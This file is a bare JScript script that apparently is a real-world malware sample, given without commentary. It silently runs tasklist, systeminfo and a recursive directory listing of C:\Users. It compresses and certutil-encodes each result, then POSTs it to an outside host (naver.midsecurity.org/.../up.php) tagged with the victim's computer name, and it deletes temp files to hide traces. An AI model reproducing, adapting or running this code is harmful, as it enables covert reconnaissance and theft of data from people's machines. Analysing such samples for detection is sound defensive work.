var sHostName = "naver.midsecurity.org/attache/20201112";
var WshNetwork = new ActiveXObject("WScript.Network");
var sComputerName = WshNetwork.ComputerName;
delete WshNetwork;
try {
	var sTempFile = ExecuteCommand("cmd /c tasklist > ");
	var strResponse = UploadResult(sHostName, sComputerName, sTempFile);
	sTempFile = ExecuteCommand("cmd /c systeminfo > ");
	strResponse = UploadResult(sHostName, sComputerName, sTempFile);
	sTempFile = ExecuteCommand("cmd /c cd /d \"C:\\Users\" && dir /a/o-d/s *.* > ");
	strResponse = UploadResult(sHostName, sComputerName, sTempFile);
	sTempFile = ExecuteCommand("cmd /c cd /d %TEMP% && del /f /q *.tmp > ");
}
catch (err) {}
function ExecuteCommand(strCmdLine)
{
	var fs1 = new ActiveXObject("Scripting.FileSystemObject");
	var sh1 = new ActiveXObject("WScript.Shell");
	sh1.RegWrite("HKCU\\Console\\CodePage", 65001, "REG_DWORD");
	sh1.CurrentDirectory = fs1.GetSpecialFolder(2);	
	var sTempName = fs1.GetTempName();
	strCmdLine += fs1.GetSpecialFolder(2) + "\\" + sTempName;
	sh1.Run(strCmdLine, 0);
	do
	{
		try	{ var f = fs1.OpenTextFile(sTempName); }
		catch(err){}
	} while (f == null);
	f.Close();
	delete fs1;
	delete sh1;	
	return sTempName;
}
function UploadResult(sHostName, sTargetDir, sLocalFile)
{
	var strResponse = "";
	try 
	{	
		var strURL = "http://" + sHostName + "/up.php?client_id=" + sTargetDir;	
		var lpString = ReadInputFile(MakeFileToUpload(sLocalFile));
		var filename = MakeFileName("ff ");
		var DataRequest = "------WebKitFormBoundaryA2D2gp2XzUyO0Qmi\nContent-Disposition: form-data; name='fileToUpload'; filename='" + filename + "'\nContent-Type: text/plain\n\n" + lpString + "\n------WebKitFormBoundaryA2D2gp2XzUyO0Qmi";	
		var HttpObj = new ActiveXObject("Microsoft.XMLHTTP");
		HttpObj.open ("POST", strURL, false);
		HttpObj.setRequestHeader ("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryA2D2gp2XzUyO0Qmi");
		HttpObj.setRequestHeader ("Content-Length", DataRequest.length);	
		HttpObj.send (DataRequest);
		strResponse = HttpObj.responseText;
		delete HttpObj;
	}
	catch (err) { strResponse = ""; }	
	return strResponse;
}
function MakeFileToUpload(strSourceFile)
{
	var fs2 = new ActiveXObject("Scripting.FileSystemObject");
	var sh2 = new ActiveXObject("WScript.Shell");
	var strCabFile = fs2.GetTempName();
	var strFileToUpload = fs2.GetTempName();
	var sCmdLine = "cmd /c makecab " + strSourceFile + " " + strCabFile + " && certutil -encode -f " + strCabFile + " " + strFileToUpload + " && del /f /q " + strSourceFile;
	sh2.Run(sCmdLine, 0);
	do
	{
		try { var f = fs2.OpenTextFile(strFileToUpload); }
		catch(err){}
	} while (f == null);
	f.Close();
	delete fs2;
	delete sh2;	
	return strFileToUpload;
}
function ReadInputFile(strFileName)
{
	var fs3 = new ActiveXObject("Scripting.FileSystemObject");
	do
	{
		try { var f = fs3.OpenTextFile(strFileName); }
		catch(err){}
	} while (f == null);
	lpString = f.ReadAll();
	f.Close();
	delete fs3;
	return lpString;
}
function MakeFileName(strPrefix)
{	
	var objDate = new Date();
	var sResult = strPrefix + objDate.getTime() + ".txt";
	delete objDate;
	return sResult;
}
